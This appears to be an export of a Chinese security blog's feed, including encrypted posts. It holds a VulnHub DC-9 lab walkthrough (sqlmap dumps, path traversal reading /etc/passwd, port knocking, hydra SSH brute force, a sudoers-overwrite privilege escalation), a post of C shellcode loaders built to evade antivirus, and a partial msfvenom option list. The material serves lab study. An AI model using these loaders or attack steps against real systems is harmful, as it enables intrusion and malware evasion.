a0c08e53231e08a90bc99464f782c024eff6a6404e59772ef00a0429f233307461604f87a73eea440dc700192a7700705d7b4fd7e7054ec1dc38102469b6478f87faa676a97adf8bea5eff46020b0d54f8e1d91033dfe779f8e767c9177e047fbffe8c33025db53b8db20de9e87ff176b0c358b179fb982855a4fa11a59e3c68eb2b59c027d344e72853d9f6fed7f573153692b08d1e4853fa31572b9e2afd798622b2a6566b04dfe78dac5f2f6dee3db5dae3fb0b80d86e84f68cdf6ca915e9eb4d2cba8adc126b5a40046c217fde34884f18f0bb4dfd3aabed03a6c01cca91f3ce6b24f56b05eab90236996e7e2243221c7033f74172841fcf7ab8c9f1d21153f2bf051425d05d03175c3d59c74293b310e2a465ffde195a21434dcf76ae50544ecb60448afcdb0d8c0889473f283593c4568d2c2bb2062623224cb6f58d8c411a7adc3e8747b693fe49de1562bf3adf0c35e0692609b3cc2dc45e0543d54623bad4748f9acbfc08eea4b8b74530bea02cac4ec287969aa774fe1d7630d1a0889572cefc36f46364359877dc07773dd473c271d5b78a9a86740f9a56fec88403daadaf6fca5886d0c9dd68afbb12bcc49ec881fc2d4e130cdcd591100d3b78a4927f5f2507d7b5db5e3dff83dcb745f1cdd5c4767507b2b0720cd08ff24e8672ab2e7e866f97e01bd96352c9216459e2b0017f33c9689b7a61f90c6e821a480b857f4bd8ddd43c481a97f466d17488fb987e69e018a9344266540d796d0662d11a66e2c9374ef809701d4de9f35be324d1ab8d7b493b964af26f25b630259f53add1adcbf5a9a5040270e42467f1abe9176aff6eff62a64e9a50eb2b32959ba83aebea55b90eeba3d83b7219d0db1283b5a13afbb33c249bb89f2dee33069f68be4f5ac39bdaae82190a4b82c8e9baf11bc7ec29104aa4da7cdc67c81eb1d92752ce09a26dee316aa7074e267b0905626074492535c09dbedc89e7be4e6748ccbd590250ac6560973c18293c3a009fc29bdd39de903495158f62b5c911aa4ac14bdc0e5f048044572ef1b2dd3d94043cba96e6352d84fe2984318a2546c3b259cdc0acb1e601c3a4abe264dc09feef1a05b51286c6086c5cf4167581bb0d14f61ef73db87aca4904cc850038909da9924ed9d0c1050b912ea8ce147332ce5fcd2021bf554daf5c60ba537f4cdde653296c31408442843cabe26f4eb64d797e538324d226981979d946531c763bdc6e9a83a75ff0cefc621d418220c2aceb9bbc1046d4962cae7aab31f2712d29d990e6c8773de2683a769bfee3cc897a8c2ebc06b3ed0e4df6124e015257d16c2d7c7392ddf02801fb5b32fad96331fd0af775b4416b561a95567d6746137a037e56b39ba7cdb7de0396d2f800cb94bec78676f5f81de8cfeb64ff94ea1d755d3f177328f2650164e55dda6f4cc696a86d1aef0aed78139db4b3533662a39b219bc1f23c044407fb047998253e5e1841e4a00ad7d51acc890e8c2e43789ea22787cc79df2994e0ac15d4e21db1a2d26dd5d4bff170a7d4a9023e9260fbac0b65216928527c237453020e5e00731eb5562db9550effc984806745fe70ebed345936f0be07bb76c9c3f8fc561351a08f5679769ca9bbe365eece7cdf9e056af4b766cfd6249404eeda2d7e6b8715070659c2f9ac439df38dafa1bb8bd8b208d9a29f78417d08554a841a31263e80964b63a97d6f920c3a5ae824f9ee0543401ea486353b55b42f71bb1a31b97ef025f8a4fd8fa9308611d31e7883b1982bb5210f4e4cbcbd4af5683ddbd1a2489adb428b0a9ccd0ac8206b748c8312dcd5ae7ecb5eec918d014345d2df288a15543718922e6309a2082609e9c4a0720cc0cbb3a6ceb994cd16f5d6ee514e1a36caa4b81d5e21cddc659431fd6df6fc7e33337e711795d07dcbde53b34259de3488b7703ce37cf267bb1bff4600ccd7647dc25cb8ca1a36d808b0940e428cb40fd224a698cbc8e87bee58417ee4d7ad0f8df7386f9641cbe2b151cd8a97a193f33531b170ebe94adbe967e62c39968534051daf45013e2d1a6eb200060335f0028eb8d848a1774a3126623209599359fd4326beb57e6c78c9cf85693324e06ccda488236d8a0ab53acb6395e02451136f6f1a4fded4d89350fe1a3c03198de61045e7eb61cbe749f6c3de6824d42015c6ee07e98269961bda9755abfa5bcaa7996f017997f884a0b4113ae45eb62a4a982e5d4ff0c39dcf60f6688dda4a626c8089a877a7a75a62f757686283a84a49f6cb9e9852f8e28d74b7cc22da9e1bb01eabd5b9462d1fea983c1add5629bda76ca3df02a3e4feeb5c1a1a27ff739236bd6c96ee5839bfe4518840d33a7f9659703576f516fc13b14ace02d12d92454cef070d240a708d2980c1f15552e99955a7ddafaa3f5eb3da36cfa00e9ddd58431b45d36aff04a3d2946a8335b53522fd379c36d5da279ff8e15131363f7904d8ac97ed0962087cfb3092e5786869ba015eb8bff1aa5d115b35af07e3d95c6016ef5d101b5106547d41429ddaf9236145f3c12fc84458624bea14b7a52788faca7c080fcc91f84b68ac2d170e6c95f17409d4e5b7f113d54b16e3280387e07748778e0dfb717840ac95b48c30ff75178d6af75111929b7b69fbc960d6b718a324dd1aad2505af9d673527e36645b0a0c5767108cd6e3b814c7a8f4be99810c5610e9690a0aca554dd19be8e37371f035131bfe08e3033bdf082330dd6a70e7f654c841635dcdfe591e79dbe2d2396eba8d9a56ecb5780945d21028da51fa20071afed9eaaded85d67d0aabde69e96ebb0bdf7d7ef36f8f3eb5503b9d739bd1a1149bdef2622dc42fab0a2853898a70ded282045cd4f878d08c383f81fa83add7094efd617bf995171e3b3220a43fc3597f62d6d1f7b8b2c7c75d5e7918d17b35c1b2d12f3150fccf946d1ebe0ac1f74a03b02918620307ffc63d790630eac561dce25fba6db32185063d7d8c57beb23b358efb9fbb891829de394527fd146d6a53aaa185e1f743f1b7fac755fed5a0a1a878ad380570a653243a256b3b6d02740e9b5accad81a7df120780647b25d1d6497331ed9e661f7c2a194a0d008a9707be0d74ee94a7bfe1ceb07f5316f568e634d86aa70cb7bcc667f40d514f33ba3bf555a70f9e437a6243a3e77ec402d81948a392698673f3aa05b849f86e008e851e892a5c7cb613b2c58565f0b9de9624bd928446b5974832c2305973432d69c56725556b532e12d9390cb035e350d030eff647661b375a469524338559f6c58ff6948e5dddba5b2dee0de1f4169ea722f8b968812665c68ab461c0c15a84d1c87e6463de618ace537c71697882fc1e9d20f075226bff7c56560159595fd73491db1af26f90fe75e092276f30b556b6728b1e6cc24dc9add2349e8e8f5a78b6c7fe529ffd3f066811da9f1621725fd763641fc4ccfb9931142dcd9a6c305938f7afd692801fbf8fb916b13ef79d55caac1f2800f44849a9c845f9fcaa887dd179bf7d7146820859d4d37197028c2e29170a2dc7c3b5f841d773980291d84346d6c9136a483c6bc163a5b4e33d7c9fb91045573bc3881e503131ad96cfb9bf268842cffa2e3dfeb73fb85f5321af2f7f8492171ecf83ff1be473fc0e4ce695c2a86b14fa138e9cc6de229c7048319a0e3dfc34eaf72e0513986b84e2151c78fb4ccbcbbbc407c7a5faabd0f463f3fd623391a6c594a4544c38310b9cbbab76e3f7c16461bf6402c867c90b2d9bfa85b14207a6fc099853bb0035b24cd7d93c5885d965032850166a39ba1faa49d4032b5a56fe00df71e604ff77ddc3d0ff91348b60ef8e9b5e28a17681cce76046f04463583d907d77af6bcfc1cfbf50649306a63d32607bf473526f9e2a074bf167fde85a3027f3ca42d039dc0f420c1e0d713d4463852261af0ef8e64bc85e23c305e72d1155b4ea1bc079c3f364952bfbd2448f19a321991c3184da3c4025e70ee5099782301af345b31e0f4247cbce242eb0e6bee230f95d8eff352cc4d520d21c0262e75581112227aec4d6890879d085f9757e9c4b2da87884bae9f8f770a1067196824cc7856198f6da70eb75eb8b72e1496d8e57ac215a597581b238aacda21d6264e1efd0ccb575dea2e6000f39f6becc89071eeacbb318c7049882a147016869c1f34fd2d18989fe5a31f83ea5cb9a7cf21851dab53bd8f4c69d468415e6e35580ba943b3b97e31021c581fe5e681f49e8240713fdfb8fa03f45833878a81a0bb571d447d0ff65c69aaa9ae998d26d98a01d9111e48609c023ace102b5cdee34cfe56d12b6fb6951838dc15616729b849464136a061f296c9aa4aea4b0f4ba3deb432307d38ad144d282897c3b4be0dad56187865a208402aa18d68a742caea26fca1bfb8636e74c2aa65123cce647e572c3d58f459471bd7887b7fd29ee98a757ce52a1baed91585e2dd876c9a0107b5cb64c7bf919fa5e187a3570e34eecf9e2b9b7cb4282ab1cbf59d021690803e3dc8ccaeff40a341eff290b5e03916063f8e8dbc2d13fab29c6a4213c9355eec5fae55a16db817f64bc926d6d4df53b2b32221b48eb493c33012d1e19493039a46f54985d282f52cf1fc00ca13becaa7dbf567ae268c0dbb582d4f1bf1e1fc3de9d5256f1f57713713041d2977e1e0aea08eb6c0d67095130c6bc70bd335481427b90ee9425ec3808b91611cabb92c6d2649f515bfd1d0968d0478b50501511fa67df911f0daefa6d987e4de2e4a5e9811b887627a3b995127655827a30b074e8c10cbbe368fac685d5f787035a0005b778a979cae39a41da4de96bd33faa2830ed53f5002ed386c9c167656bba7ad6032ada675ea8f3e3c0704b1d859ad9aed8f45b5c61a331882e0d7cfba6ea57c0f740e3b1fe5543dbd587ae3ec7e4068f4087ffbe37f982895c177269f8549eb1d542c103bfe2c8d2ba446f1341053748aefff8347d27f5ed03220952f9451fdc923d22391fd5e51ad728bdcb77447115ee84383182520839f90a43dd2249c0ba4831bc311224b989072dac2fa2dcd8d2c60e2a91625fe9fb8a4689725695902ef76d852ed7c5c0ada4732a480062276ce052c7e330c477643d8cb8e6c40079175639c8d7118a39c6e843c1f810433dde792831c50e33d891cbf22409029f6098267eda17ce2e2f137ba7344f05dc08ae064a8cf8ece9d31c86a40e5f3bc238e79bbbd934afd4909facef5aad00c6cb1f070bab0204f1523a84be1a15213dccedf40bc1579ec8700ad79b3baa2dc784b6de13f492a90b3f562d3a2caebac37f8fcf2bef129cac542dea47488fa5c281a5f106c1f4cfc185f1f18522c3ee8cd41833b9c03c9390772a0a3912500d4ef0867ba9f31978d7d5f0a6245b4d5f1f0c5f2921a99db6a32b1ef0652ab74d1de81e8cdfe37fd4d3dad8b7d1e228d14dc4cc8f57ba1a1e4eb8d69af7f6ce6b50fc1443af024f8a50ab5421aa78064198c520a738ccdb7d7dee85de8b1f4d3461d57af92bc220044fd1b484fd33243db5985ab2afe1bd586e18f24d7f5fd35e99d9f80dcac1b1f9d9af15114fac31ec2744038ac6ac751c482065c9c447a662db89bdb567a6880d1163d8d1079dee9d8b528577fb8c0e129e6a5a9515a573492bca92d5206bc132f5b90f2a5698f7cc4cd807c35837ac1ed67031e27fb9d37829bcaa2cd71a6fbc00dc5ec63683182f010f2728d20d01f3a810c20d30a6270cca8f7a01afa79c451281d881ddc24600393223c8620b1c1352d7a67f99bae144e81cf58acf135d04e85fa788f109afa5a3682bb655bce2ecc1c49f8252107b2fef64f8df120188ae1329fc6e8a5a82cc8cada9219bf4adc775d4dcd40612cf70b0fb2109d242409ea67348d5318b398f6f46e3cc4c490baf0eccbb22263a44f11608c3e27f7ba8a706a429ab320c2d378089166c5be2508c70b4aaa1e004e84b9f71f8832c90e439b50b0ce3955df6d19e17b148f0bae9636900de5c01d06eb7778ae6fb90dfae49a38ecbf5d971c0a06cab371bf1e5c3a057e4863434a3356874f8940fd43742eddd6f67fb10fa1a0772570f2ac428fcb4726dc6fd82f28a6cfa09a8b1aad09844b8a6f48c73a09120977a159aa25b76b60dbe2d9b6e8648b6620e6c1e4ccaf305d441a20e4326392ff7020f5bb1ac257970876441d8ab4a1d020812c09503ba52bd28831039edb06220892132c5836dfe21ffd263860afe23e12f0dd80d2d2fe4751f46190fd40bce099fb3f23a9f3670e1d113c97023d36e1a2f66964b7d3a7154d2ba467acd7a4a10b8617c66c70b979e92901e4202fd046e424d35ead44b99a5fd68d3eb58300e2829b3d0cafe7b6fcc810309254f1694d9fd496069965669a1ae0e88457c9f0a10b2d739ed7da22c0f96877dd1e5c24e2f08433df8059c62af9eeafc62e8a7ca9943eca59f1669e001c0371cfbb5957b71d5bb77cb38b12072913fc1e60baf27662a0e58aaec312738be1d7e4bf76312d8b867939858106fc9dd6544157541e442e3826d2f855963c9a73b1f2a9c3471568165820ecc2d765320dd191a1e164167b7f33880f7909e32891b9bb1851410cb145895c1b6654c4686141ed00b45283cb0a4d594524d1a6f44b830578f39b7fe5aeb110ae933f4967abd195aba650445319c80fdccc4d1cba1b1c7843201748ab0219071710a2294d7a4e7f896a63a05d2194a70eb76744965bf06d62a44a7a36ead32dfc4c6f00a1aab2867350587276513101816b01983f54218e98af49bf20fd852216ca9ec9098af1559192eeb9fef2efbd8b5ab90583c5c39c448f87533d434df4d258e0c46f126d1b0d480f3b5d701fe082209ab4890f776260a6aa82d50cc75e2a4240ebd7cc4cc144cfa817316ded6d9ffcd40701d09a2f2598b8cb806a8256854fd822192fd1acca0a22be4f2c891daef9625fb4b27f4eff3b67e3afb81944c7b90e6126d538467cdced86a23bdb9c75b068ad9b2fc57b26a394db9845322451a67d7f180d62ec26ca38fbfb1df1395d4ead756461c930acab0467088a0b7594650f6cb990baa0189ad2b7a1f185a15da441419d961cac626cf1e98c09537453ef76cd8f4011d97c51eca6eff4c2a2da6cf0c7a4988ed1a68dbfb604048ae1fe678bf65f8a6005c0d5321b357560b537f2cd80c9cb619ea7e82af772b93c1097fdbabb1fd2e6e5072c7501676496b07b4b9485ac2c61c0989fa5691b7c7152cde383ea40f47e01bb839bcf6ae571f4846802e81ea9bece58eee82da78953d893704e9717026b679404980c655e08518de9009a76a5cbf6e4be3610f5d35bab04ca19a940e80ffa273a30b7aaaf0584aecfe10d35e2bcccd0ff57b0c1f1e03d3c7aacb705765b087c164e489615254368d40f46f71574cd285276ca08360747a2a5c768bce660c0e32e1c1951780b288756f41ac811d9b1681e503a2c303be3c29949b364ab86507f23250b9606300cc2698df1497a37516fb4a331e71fd7b8ed2c3acdbba26185a90b65bd6352bf0c6fa38df554fb5728f1f76eaa139ca8fde6b7aeb7d726d2cc399e5f1998b09b50c0400c4bbef23a913c30b0303bb11c39edfa2a6c063184756caebd9e8c38ad8ffa8ffae368491bafc8ffb57ccb1b87587ea8fa9f3b9632d0c7192fcafb67df414219b7d5b3ced57257a18d4d9ce1057ea79d2839970cf4da328d31fd0f15c17cd676be435ab198e2422106f103528edf11073083e82005b1dce7b5dc09a861e611b1414a714f8be48a7b981ff24472f2ec1bb0adad4400a101bb56a3f005b75a9a2b097a6ed5492158cc27761a4b08a7ce7c2f1d6cb7a4288fc3fdcdce0e51f3b80cf35a4725f76b7af6170e980d06b8e3317c57d45e6c4376bbd976f20068eae7b949d1a748cd71a2539f25eb9e9827365eaf8cd27d90bacd4ee1a51100b3e4ccb2e52da83141836d18c1228ac1c62adb975d7406dd0c9591b5278c02dc3874e0752767940336aee4c29ac03fd65bb98ce5fc0dc0c4c9768145637e4229450230eef44c51f6d1db332552a109bda6665ed01ec4bf03bf3505efc7eeab90333c800e61e0a6da7e09adacebd6739c559b8c4f1412184d2ad34de1b1add5f057a995365686b700b49c9836bff5573b1c0ac49056f633103980054eee5d92362a330a473875ba814</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-9</title>
    <url>/2022/04/30/DC-9/</url>
    <content><![CDATA[<p>渗透环境DC-9：<a href="https://www.vulnhub.com/entry/dc-9,412/">https://www.vulnhub.com/entry/dc-9,412/</a><br>攻击机：192.168.168.128<br>靶机：192.168.168.137</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br><span class="line">nmap -sS -p- 192.168.168.137</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/30/DC-9/1.png" alt="img"></p>
<p>开放的是80端口，访问</p>
<p><img src="/2022/04/30/DC-9/2.png" alt="img"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>发现有一个search框，可能存在sql注入，抓包扔到sqlmap试试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r post.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/30/DC-9/3.png" alt="img"></p>
<p>确认存在sql注入<br>后面就是常规的查看数据库了, 因为不是dba所以不能用sqlmap getshell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r post.txt --dbs</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/30/DC-9/4.png" alt="img"></p>
<p>有Staff与users这两个相关的数据库<br>看看这两个数据库有什么东西</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r post.txt -D Staff --dump </span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/30/DC-9/5.png" alt="img"></p>
<p>下面的admin应该是后台的登录账号<br>这里的加密可以用sql自带的加密进行破解，也可以到md5解密网页破解<br>账号：admin<br>密码：transorbital1</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r post.txt -D <span class="built_in">users</span> --dump </span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/30/DC-9/6.png" alt="img"></p>
<p>又是一些账号密码先记录下来吧</p>
<p>登录admin看看先</p>
<p><img src="/2022/04/30/DC-9/7.png" alt="img"></p>
<p>有这样的字眼，可能有文件包含，试试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.168.137/welcome.php?file=../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/30/DC-9/8.png" alt="img"></p>
<p>确实有，然后我就不会做了，尴尬！！！<br>看看其他师傅的做法<br>有这么的一个文件与ssh端口有关knockd.conf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">view-source:http://192.168.168.137/welcome.php?file=../../../../../etc/knockd.conf</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/30/DC-9/9.png" alt="img"></p>
<p>我们用nmap对这3个端口进行访问就能开ssh的锁了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -p 7469 192.168.168.137</span><br><span class="line">nmap -sS -p 8475 192.168.168.137</span><br><span class="line">nmap -sS -p 9842 192.168.168.137</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/30/DC-9/10.png" alt="img"></p>
<p>开锁成功<br>使用hydra进行爆破，字典是users数据库中的账号和密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P password.txt  192.168.168.137 ssh</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/30/DC-9/11.png" alt="img"></p>
<p>有三个账号都上上看看有什么文件啥的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -a //可以看到隐藏的文件</span><br></pre></td></tr></table></figure>

<p>在janitor用户下发现了一些密码</p>
<p><img src="/2022/04/30/DC-9/12.png" alt="img"></p>
<p>接着用hydra继续爆破</p>
<p><img src="/2022/04/30/DC-9/13.png" alt="img"></p>
<p>又多了一个用户啊，登录看看<br>login：fredf<br>password：B4-Tru3-001<br>查看可用信息</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img src="/2022/04/30/DC-9/14.png" alt="img"></p>
<p>发现&#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;test&#x2F;test<br>去看看，直接执行没有什么反应，看看源文件</p>
<p><img src="/2022/04/30/DC-9/15.png" alt="img"></p>
<p>argv[1]是读取的文件，argv[2]是将argv[1]文件的内容写入的目标<br>ok，这里我们把东西写入&#x2F;etc&#x2F;sudoers</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;fredf ALL=(ALL)NOPASSWD: ALL&quot;</span> &gt; /tmp/sudoers</span><br><span class="line">sudo /opt/devstuff/dist/test/test /tmp/sudoers /etc/sudoers</span><br></pre></td></tr></table></figure>

<p>这样就ok啦</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>

<p>提权成功，然后就是取拿flag了</p>
<p><img src="/2022/04/30/DC-9/16.png" alt="img"></p>
<p>ALL CLEAR!!!!</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">DC系列到处就结束了，从中学到了很多的思路，流程什么的，收获很多，后面对学到的东西做个总结啥的，方便以后使用。</span><br><span class="line">本次的ssh锁可以说是本次的一个大收获呢，就这样把。</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>实践</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>免杀-代码篇</title>
    <url>/2022/07/19/%E5%85%8D%E6%9D%80-%E4%BB%A3%E7%A0%81%E7%AF%87/</url>
    <content><![CDATA[<h2 id="C-x2F-C"><a href="#C-x2F-C" class="headerlink" title="C&#x2F;C++"></a>C&#x2F;C++</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="comment">//使得windows控制台程序不出黑窗口</span></span><br></pre></td></tr></table></figure>

<h3 id="指针执行"><a href="#指针执行" class="headerlink" title="指针执行"></a>指针执行</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[]=<span class="string">&quot;shellcode&quot;</span>; </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    ((<span class="type">void</span>(*)(<span class="type">void</span>))&amp;buf)();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="申请动态内存加载"><a href="#申请动态内存加载" class="headerlink" title="申请动态内存加载"></a>申请动态内存加载</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[]=<span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *Memory;</span><br><span class="line">    Memory=VirtualAlloc(<span class="literal">NULL</span>,<span class="keyword">sizeof</span>(buf),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(Memory,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    ((<span class="type">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="嵌入汇编加载"><a href="#嵌入汇编加载" class="headerlink" title="嵌入汇编加载"></a>嵌入汇编加载</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[]=<span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax,offset buf</span><br><span class="line">        jmp eax</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[]=<span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    ((<span class="type">void</span>(WINAPI*)(<span class="type">void</span>))&amp;buf)()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="汇编花指令"><a href="#汇编花指令" class="headerlink" title="汇编花指令"></a>汇编花指令</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/section:.data.RWE&quot;</span>)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[]=<span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax,offset buf</span><br><span class="line">        _emit <span class="number">0xFF</span></span><br><span class="line">        _emit <span class="number">0xE0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>免杀</tag>
        <tag>代码</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro反序列化</title>
    <url>/2022/07/15/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="7bbb87acad25e36a9dea00885e9c1c40f37386cc5e91c301be0d73713c32dfb8">64298517335d289f58328e86560839708aac5cc9050af18c78daab162622fc4c63528558c4925249ae02c05dc64a4e24f0a6f8edbd50a9faf8a1e09e5c92d7574494c292ead86e7ac97241adca985e9aeb57bc88b537a7f34ceb8b06f59f6eabccc3c12cb10efe2ac86fd766481b978128c04a58911095fe997f6a7528f73eecf15364cbfe4584ce0be705fecf83df505e99385973133271c3d73b4e63342a806ee2d8ed9a8e557dfd1414f0d0ef5ed4</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>免杀-工具篇</title>
    <url>/2022/05/11/%E5%85%8D%E6%9D%80-%E5%B7%A5%E5%85%B7%E7%AF%87/</url>
    <content><![CDATA[<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><h3 id="常见参数"><a href="#常见参数" class="headerlink" title="常见参数"></a>常见参数</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">-p,-payload&lt;payload&gt;指定需要使用的payload</span><br><span class="line">-l,-list[module_type]列出指定模块的所有可用资源，模块类型包括：payloads，encoders, nops, all</span><br><span class="line">-n,-nopsled&lt;length&gt;为payload预先指定一个NOP滑动长度</span><br><span class="line">-f,-format&lt;format&gt;指定输出格式</span><br><span class="line">-e,-encoder[encoder]指定需要使用的encoder(编码器)</span><br><span class="line">-a,-arch&lt;architecture&gt;指定payload的目标架构,例如x86|x64|x86_64</span><br><span class="line">-platform&lt;platform&gt;指定payload的目标平台</span><br><span class="line">-s,-space&lt;length&gt;设定有效攻击载荷的最大长度,文件大小</span><br><span class="line">-b,-bad-chars&lt;list&gt;设定规避字符集，指定需要过滤的坏字符(&#x27;\x0f&#x27;、&#x27;\x00&#x27;)</span><br><span class="line">-i,-iterations&lt;count&gt;指定payload的编码次数</span><br><span class="line">-c,-add-code&lt;path&gt;指定一个附加的win32 shellcode文件</span><br><span class="line">-x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中,就是捆绑的意思</span><br><span class="line">-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">–payload-options 列举payload的标准选项</span><br><span class="line">-o, –out &lt; path&gt; 